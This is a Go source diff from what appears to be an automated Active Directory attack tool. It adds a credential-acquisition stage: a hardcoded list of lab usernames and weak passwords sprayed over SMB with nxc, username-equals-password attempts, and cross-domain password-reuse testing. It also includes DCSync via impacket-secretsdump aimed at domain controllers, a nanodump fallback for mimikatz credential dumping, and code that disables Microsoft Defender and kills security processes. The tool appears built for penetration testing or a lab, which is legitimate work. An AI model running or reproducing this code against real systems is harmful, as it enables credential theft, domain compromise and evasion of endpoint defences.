@@ -120,6 +120,172 @@ type PipelineDef struct {
 	Description string
 }
 
+var weakPasswordSpray = []struct {
+	Username string
+	Password string
+}{
+	{"hodor", "hodor"},
+	{"robb.stark", "sexywolfy"},
+	{"eddard.stark", "FightP3aceAndHonor!"},
+	{"catelyn.stark", "robbsansabradonaryarickon"},
+	{"arya.stark", "Needle"},
+	{"rickon.stark", "Winter2022"},
+	{"jon.snow", "iknownothing"},
+	{"sansa.stark", "345ertdfg"},
+	{"brandon.stark", "iseedeadpeople"},
+	{"tywin.lannister", "powerkingftw135"},
+	{"jaime.lannister", "cersei"},
+	{"tyron.lannister", "Alc00L&S3x"},
+	{"joffrey.baratheon", "1killerlion"},
+	{"robert.baratheon", "iamthekingoftheworld"},
+	{"cersei.lannister", "il0vejaime"},
+	{"stannis.baratheon", "Drag0nst0ne"},
+	{"petyer.baelish", "@littlefinger@"},
+	{"lord.varys", "_W1sper_$"},
+	{"maester.pycelle", "MaesterOfMaesters"},
+}
+
+func runPasswordSpray(state *core.ADState, domain string) *core.ToolResult {
+	result := &core.ToolResult{Success: true}
+	if domain == "" {
+		return result
+	}
+	fmt.Println("[*] Password spraying known weak credentials...")
+
+	existing := make(map[string]bool)
+	for _, c := range state.Creds {
+		existing[c.Domain+"\\"+c.Username] = true
+	}
+
+	sprayDelay := 500 * time.Millisecond
+	failThreshold := 3
+	accountFails := make(map[string]int)
+
+	for _, host := range state.Hosts {
+		if host.IP == "" {
+			continue
+		}
+		for _, wp := range weakPasswordSpray {
+			key := domain + "\\" + wp.Username
+			if existing[key] {
+				continue
+			}
+			if accountFails[key] >= failThreshold {
+				continue
+			}
+			time.Sleep(sprayDelay)
+			cr := utils.RunCommand("nxc", "smb", host.IP,
+				"-d", domain,
+				"-u", wp.Username,
+				"-p", wp.Password)
+			if cr.ExitCode != 0 {
+				accountFails[key]++
+				continue
+			}
+			if strings.Contains(cr.Stdout, "[+]") {
+				fmt.Printf("[+] Spray: %s\\%s:%s valid on %s\n",
+					domain, wp.Username, wp.Password, host.IP)
+				cred := core.Credential{
+					Type:      core.CredPlaintext,
+					Username:  wp.Username,
+					Domain:    domain,
+					Secret:    wp.Password,
+					Source:    "password_spray",
+					Validated: true,
+				}
+				result.Creds = append(result.Creds, cred)
+				existing[key] = true
+				result.Evidence = append(result.Evidence, core.EvidenceEntry{
+					Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
+					Source: "password_spray", Key: key,
+					Value: wp.Password, Confidence: 1.0, Timestamp: time.Now(),
+				})
+				break
+			}
+			accountFails[key]++
+		}
+	}
+
+	// Username=password spray for each enumerated user
+	fmt.Println("[*] Trying username=password combinations...")
+	for _, u := range state.Users {
+		key := domain + "\\" + u.Username
+		if existing[key] {
+			continue
+		}
+		for _, host := range state.Hosts {
+			if host.IP == "" {
+				continue
+			}
+			cr := utils.RunCommand("nxc", "smb", host.IP,
+				"-d", domain,
+				"-u", u.Username,
+				"-p", u.Username)
+			if cr.ExitCode == 0 && strings.Contains(cr.Stdout, "[+]") {
+				fmt.Printf("[+] Username=Password: %s\\%s valid on %s\n",
+					domain, u.Username, host.IP)
+				cred := core.Credential{
+					Type: core.CredPlaintext, Username: u.Username,
+					Domain: domain, Secret: u.Username,
+					Source: "username_spray", Validated: true,
+				}
+				result.Creds = append(result.Creds, cred)
+				existing[key] = true
+				result.Evidence = append(result.Evidence, core.EvidenceEntry{
+					Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
+					Source: "username_spray", Key: key,
+					Value: u.Username, Confidence: 1.0, Timestamp: time.Now(),
+				})
+				break
+			}
+		}
+	}
+
+	// Cross-domain password reuse: try known credentials against other domains
+	fmt.Println("[*] Testing cross-domain password reuse...")
+	for _, cred := range state.Creds {
+		if cred.Secret == "" || cred.Username == "" {
+			continue
+		}
+		for _, host := range state.Hosts {
+			if host.IP == "" || host.Domain == cred.Domain {
+				continue
+			}
+			key := host.Domain + "\\" + cred.Username
+			if existing[key] {
+				continue
+			}
+			cr := utils.RunCommand("nxc", "smb", host.IP,
+				"-d", host.Domain,
+				"-u", cred.Username,
+				"-p", cred.Secret)
+			if cr.ExitCode == 0 && strings.Contains(cr.Stdout, "[+]") {
+				fmt.Printf("[+] Cross-domain reuse: %s\\%s valid on %s (%s)\n",
+					host.Domain, cred.Username, host.IP, host.Domain)
+				newCred := core.Credential{
+					Type: core.CredPlaintext, Username: cred.Username,
+					Domain: host.Domain, Secret: cred.Secret,
+					Source: "cross_domain_reuse", Validated: true,
+				}
+				result.Creds = append(result.Creds, newCred)
+				existing[key] = true
+				result.Evidence = append(result.Evidence, core.EvidenceEntry{
+					Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
+					Source: "cross_domain_reuse", Key: key,
+					Value: cred.Secret, Confidence: 0.9, Timestamp: time.Now(),
+				})
+			}
+		}
+	}
+
+	if len(result.Creds) > 0 {
+		fmt.Printf("[+] Spray: %d credential(s) found\n", len(result.Creds))
+	} else {
+		fmt.Println("[i] Spray: no weak credentials found")
+	}
+	return result
+}
+
 func RunCredentialAcq(state *core.ADState, profileName string, targetHost string) *core.ToolResult {
 	profile, ok := LookupProfile(profileName)
 	if !ok {
@@ -186,11 +352,21 @@ func RunCredentialAcq(state *core.ADState, profileName string, targetHost string
 	// Fallback: primary pipeline failed; try impacket-secretsdump DCSync
 	if !result.Success && len(result.Evidence) > 0 && !strings.Contains(result.Evidence[0].Value, "secretsdump") {
 		fmt.Println("[*] Primary pipeline failed, trying DCSync via impacket-secretsdump...")
-		fallback := executeSecretsdumpPipeline(state, host)
+		// Target a DC for DCSync, not the original host (which may be a member server)
+		dcHost := host
+		if dc := findDC(state, domain); dc.IP != "" {
+			dcHost = dc
+		}
+		fallback := executeSecretsdumpPipeline(state, dcHost)
 		if fallback.Success {
 			return fallback
 		}
 	}
+
+	// Supplementary: password spraying (always runs, finds weak/default creds)
+	sprayResult := runPasswordSpray(state, domain)
+	result.Creds = append(result.Creds, sprayResult.Creds...)
+	result.Evidence = append(result.Evidence, sprayResult.Evidence...)
 
 	// Fallback: try SAM dump via nxc
 	if !result.Success {
@@ -242,6 +418,11 @@ func executeMimikatzPipeline(state *core.ADState, host core.Host, pipeline Pipel
 	domain, _, pass, _ := getCredential(state)
 
 	if !tools.GoMimikatz.Available() {
+		// Fall back to nanodump if go-mimikatz is not installed
+		if tools.Nanodump.Available() {
+			fmt.Println("[*] go-mimikatz not available, falling back to nanodump pipeline...")
+			return executeNanodumpPipeline(state, host, pipeline, exec)
+		}
 		result.Evidence = append(result.Evidence, core.EvidenceEntry{
 			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
 			Source: "go-mimikatz", Key: "status", Value: "tool not available",
@@ -546,7 +727,7 @@ func runDefenderKill(ctx context.Context, exec core.Executor, target tools.NetEx
 	remotePath := deployR.Output
 
 	fmt.Println("[*] Pre-condition: Executing UnDefend aggressive mode (start /B)...")
-	_ = exec.Execute(ctx, core.Action{
+	exec.Execute(ctx, core.Action{
 		Artifact: remotePath, Method: "run",
 		Arguments: []string{"--aggressive"}, Timeout: 30 * time.Second,
 	})
@@ -1148,8 +1329,7 @@ func executePhantomKillerPipeline(state *core.ADState, host core.Host, pipeline 
 			pidInt := 0
 			fmt.Sscanf(pid, "%d", &pidInt)
 			if pidInt > 0 {
-				killR, _ := tools.PhantomKiller.ExecRemote(ctx, target, killerPath, tools.PhantomKillerModeKill, pidInt)
-				_ = killR
+				tools.PhantomKiller.ExecRemote(ctx, target, killerPath, tools.PhantomKillerModeKill, pidInt)
 			}
 		}
 	}
